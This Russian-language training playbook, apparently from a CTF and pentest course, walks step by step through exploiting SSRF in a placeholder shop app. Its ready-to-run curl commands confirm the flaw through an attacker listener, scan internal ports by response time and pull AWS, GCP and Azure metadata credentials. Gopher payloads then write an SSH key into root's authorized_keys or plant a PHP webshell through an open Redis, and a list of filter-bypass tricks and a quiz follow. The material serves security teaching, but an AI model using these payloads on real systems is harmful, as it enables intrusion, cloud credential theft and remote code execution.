---
id: web-playbook-ssrf-to-internal
title: "Плейбук: SSRF — от подтверждения до внутренней сети и RCE"
category: web
parent: web-playbooks-exploit
difficulty: hard
order: 3
tags: [playbook, ssrf, metadata, gopher, redis, internal, decision-tree, web]
prerequisites: [web-ssrf-core, web-ssrf-cloud-deep, web-playbook-recon-to-foothold]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 38
summary: "Decision-tree для SSRF: подтвердить → внутренний порт-скан → cloud metadata → внутренние сервисы (redis/memcached/mysql) → gopher → RCE."
---

## Задача

На `https://shop.target.local` есть параметр `?url=`: сервер сходил по нашему URL. Значит, он стал **нашим прокси во внутреннюю сеть**. Вопрос: что там, за периметром, и как из «сервер сделал GET» получить креды, данные или код.

Этот плейбук — маршрут от подтверждения SSRF к внутреннему скану, метаданным облака, сервисам вроде Redis и, через `gopher://`, к RCE.

## Данные, с которыми работаем

`GET /fetch?url=...` на `https://shop.target.local`, наш listener на `YOUR_IP`, `interactsh-client` для OOB. Пройдём дерево.

## Дерево решения

```
[SSRF: сервер ходит по моему URL]
   ├─(1) ПОДТВЕРДИТЬ: отражённый / blind / ограниченный
   ├─(2) ВНУТРЕННИЙ ПОРТ-СКАН (127.0.0.1, 10.0.0.0/8, 169.254.169.254)
   ├─(3) CLOUD METADATA ──► креды/токены ──► доступ к облаку
   ├─(4) ВНУТРЕННИЕ СЕРВИСЫ: Redis 6379, Memcached, Elasticsearch, Docker
   └─(5) GOPHER → RCE (Redis: cron/SSH/webshell) ──► [код / креды / данные]
```

## Шаг 1: подтвердить SSRF и понять канал

Сначала пойми, **что именно контролирует сервер**: URL целиком, только хост, только путь.

```bash
# отражённый SSRF: подставляем свой listener
$ python3 -m http.server 80 &
$ curl -s --get --data-urlencode 'url=http://YOUR_IP/ssrf-test' https://shop.target.local/fetch
# в логе listener: GET /ssrf-test  -> SSRF есть

# возвращается ли тело ответа (полный) или только статус (blind)
$ curl -s --get --data-urlencode 'url=http://127.0.0.1/' https://shop.target.local/fetch | head -3
<!DOCTYPE html><html>...            # полный SSRF -> можно читать
```

**Условие ветвления:** приходит запрос на listener → SSRF есть. Видишь тело внутреннего ответа → «полный» SSRF. Только задержка/статус → blind, работаем через OOB.

## Шаг 2: внутренний порт-скан

Используем сервер как сканер: время ответа и ошибки говорят, открыт порт или нет.

```bash
$ for port in 22 80 6379 8080 9200 11211 2375; do
    t=$(curl -s -o /dev/null -w '%{time_total}' --get \
        --data-urlencode "url=http://127.0.0.1:$port/" https://shop.target.local/fetch)
    echo "127.0.0.1:$port -> $t"
  done
127.0.0.1:6379 -> 0.021      # быстро -> открыт
127.0.0.1:9200 -> 0.018
127.0.0.1:2375 -> 0.350      # таймаут -> закрыт/фильтр
```

**Условие ветвления:** открыт 6379/11211/9200 → шаг 4. Открыт 80/8080 внутри → админки/API (auth-плейбук). Доступен `169.254.169.254` → шаг 3.

## Шаг 3: cloud metadata

```bash
# --- AWS (IMDSv1) ---
$ curl -s --get --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' https://shop.target.local/fetch
ec2-admin-role
$ curl -s --get --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin-role' https://shop.target.local/fetch
{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}

# --- GCP (нужен заголовок Metadata-Flavor: Google) ---
$ curl -s --get --data-urlencode 'url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
    -H 'Metadata-Flavor: Google' https://shop.target.local/fetch

# --- Azure ---
$ curl -s --get --data-urlencode 'url=http://169.254.169.254/metadata/instance?api-version=2021-02-01' \
    -H 'Metadata: true' https://shop.target.local/fetch
```

**Условие ветвления:** получил `AccessKeyId`/`Token` → это креды облака: переходи в `playbook-cloud`. Нет доступа → IMDSv2 включён; ищи другой сервис (шаг 4).

## Шаг 4: внутренние сервисы

```bash
# Redis без пароля
$ curl -s --get --data-urlencode 'url=gopher://127.0.0.1:6379/_INFO%0D%0A' https://shop.target.local/fetch

# Elasticsearch: открытый дамп
$ curl -s --get --data-urlencode 'url=http://127.0.0.1:9200/_cat/indices?v' https://shop.target.local/fetch

# Docker API (часто = root на хосте)
$ curl -s --get --data-urlencode 'url=http://127.0.0.1:2375/version' https://shop.target.local/fetch
```

**Условие ветвления:** Redis без пароля → шаг 5. Elasticsearch открыт → дамп и поиск секретов. Docker API доступен → контейнер-эскейп (`svc-docker-k8s`).

## Шаг 5: gopher → RCE (Redis как пример)

`gopher://` отправляет на внутренний TCP-порт **произвольные байты** — значит, мы говорим на языке сервиса. Redis без пароля через запись файлов даёт RCE.

```bash
# Идея: CONFIG SET dir + dbfilename + SET + SAVE = запись файла.
# 5.1 SSH-ключ в authorized_keys (путь к root)
$ curl -s --get --data-urlencode \
  'url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh/%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASET%20x%20%22%5Cn%5Cnssh-rsa%20AAAA...%3D%3D%20a%5Cn%5Cn%22%0D%0ASAVE%0D%0A' \
  https://shop.target.local/fetch
$ ssh -i id_rsa root@shop.target.local

# 5.2 Webshell (если известен webroot)
#   CONFIG SET dir /var/www/html/ ; CONFIG SET dbfilename shell.php
#   SET x "<?php system($_GET['c']); ?>" ; SAVE
```

**Условие ветвления:** запись удалась → проверь доступ (`ssh`, `curl webshell`). Не удалась (нет прав/`CONFIG` отключён) → пробуй replication RCE или запись в `/var/spool/cron`.

**Осторожно:** запись в `authorized_keys`/`cron`/webroot меняет состояние системы. Не перезаписывай чужие файлы и не запускай деструктивных команд. `SAVE` временно блокирует Redis.

## Шаг 6: blind SSRF и OOB

```bash
$ interactsh-client -v          # твой <id>.oast.fun
$ curl -s --get --data-urlencode 'url=http://<id>.oast.fun/probe' https://shop.target.local/fetch
# в логе interactsh видно DNS/HTTP -> сервер сделал запрос

# blind-скан портов по времени
$ for port in 6379 9200 8080; do
    curl -s -o /dev/null -w "$port %{time_total}\n" --get \
      --data-urlencode "url=http://127.0.0.1:$port/" https://shop.target.local/fetch
  done
```

## Полный прогон от начала до конца

1. `?url=http://YOUR_IP/` → запрос пришёл → SSRF подтверждён.
2. Порт-скан по времени → открыт `6379`.
3. `169.254.169.254` → креды роли (если облако).
4. `gopher://127.0.0.1:6379/_INFO` → Redis без пароля.
5. `CONFIG SET` + `SET` + `SAVE` → webshell/SSH → RCE.
6. Артефакт: `ssh`-вход или вывод `id` из webshell.

## Если не сработало — пробуй это

- **Whitelist доменов.** `http://allowed.com@127.0.0.1/`, `http://127.0.0.1#allowed.com`, DNS-rebinding, `allowed.com.attacker.tld`.
- **Блок приватных IP.** Десятичный (`http://2130706433/`), восьмеричный, IPv6 (`http://[::1]/`), `http://0/`, `http://0x7f000001/`.
- **Только http(s).** Редирект с твоего сервера на `gopher://`/`file://`.
- **Ограничение по длине.** Короткий редирект (301) на длинный payload.
- **IMDSv2 (нужен PUT + токен).** SSRF через GET не сработает — ищи SSRF с произвольным методом.

## Тупики

- Гонять `gopher://` в никуда, не подтвердив, что порт открыт.
- Пытаться читать AWS metadata на GCP-хосте — другие адреса/заголовки.
- Записывать файлы через Redis без проверки прав/`CONFIG` — молча не сработает.
- Перебирать тысячи внутренних IP «на удачу» — узкий список эффективнее.
- Игнорировать, что SSRF может быть ограничен редиректом.

## Что мы теперь знаем

- SSRF бывает отражённый (полный), blind и ограниченный.
- Внутренний порт-скан делается по времени ответа.
- Метаданные облака (`169.254.169.254`) — быстрый путь к кредам.
- `gopher://` даёт сырой TCP-обмен → RCE через Redis.
- Blind-точки подтверждаются OOB-каналом (interactsh).

## На что смотреть дальше

- **IMDSv2.** PUT+токен ломает GET-based SSRF — ищи другой канал.
- **Ограничения и обходы.** Whitelist обходится `@`/`#`/DNS-rebinding.
- **Не деструктивно.** Запись через Redis — аккуратно; `SAVE` блокирует инстанс.
- **Стабилизация.** Полученный SSH/webshell — для пивота; не флуди.
- **Egress-фильтрация.** Понимание этого плейбука объясняет, почему она критична.

## Квиз

Проверь себя.

```quiz
- question: "Что означает 'полный' SSRF в отличие от blind?"
  options:
    - "Приложение возвращает тело ответа внутреннего сервиса"
    - "Запрос приходит только по HTTPS"
    - "Сервер перезагружается"
    - "Нет разницы"
  answer: 0
  explanation: "Полный SSRF отдаёт содержимое внутреннего ответа; blind — только факт запроса."
- question: "Какой адрес используется для метаданных AWS/GCP/Azure?"
  options:
    - "8.8.8.8"
    - "169.254.169.254"
    - "127.0.0.53"
    - "224.0.0.1"
  answer: 1
  explanation: "169.254.169.254 — link-local адрес сервиса метаданных облака."
- question: "Зачем при SSRF используют схему gopher://?"
  options:
    - "Она быстрее http"
    - "Она позволяет отправить произвольные байты на внутренний TCP-порт (например, Redis)"
    - "Она шифрует трафик"
    - "Она обходит DNS"
  answer: 1
  explanation: "gopher передаёт сырые байты — так говорят на языке Redis/Memcached и т.п."
- question: "Redis доступен без пароля. Какой маршрут ведёт к RCE?"
  options:
    - "Никак, Redis безопасен"
    - "CONFIG SET dir + dbfilename + SET + SAVE — запись файла (SSH-ключ/cron/webshell)"
    - "Только через SQL"
    - "Через XSS"
  answer: 1
  explanation: "Запись файла через смену dir/dbfilename и SAVE даёт SSH-ключ, cron или webshell."
- question: "Приложение ходит только на whitelisted домен. Что попробовать?"
  options:
    - "Сдаться"
    - "Обходы: userinfo @, фрагмент #, DNS-rebinding, поддомен на ваш домен"
    - "Сменить User-Agent"
    - "Запустить sqlmap"
  answer: 1
  explanation: "Whitelist обходят через @-userinfo, #, DNS-rebinding и поддомены на ваш домен."
```

## Куда дальше

Дальше (`web-csp-advanced`) мы уйдём в клиентскую безопасность — Content Security Policy и её обход. А пока главное запомни: SSRF превращает сервер в твой прокси, и цель ветки — не «сервер ответил», а креды, данные или код.

## Где пригодится

- **CTF (Web):** классическая цепочка SSRF → metadata/redis → RCE, частый источник флагов.
- **Bug bounty:** корректная демонстрация влияния SSRF на внутреннюю сеть и облако.
- **Пентест:** выход за периметр веб-приложения во внутреннюю инфраструктуру.
- **Работа (AppSec):** понимание, почему egress-фильтрация и IMDSv2 критичны.
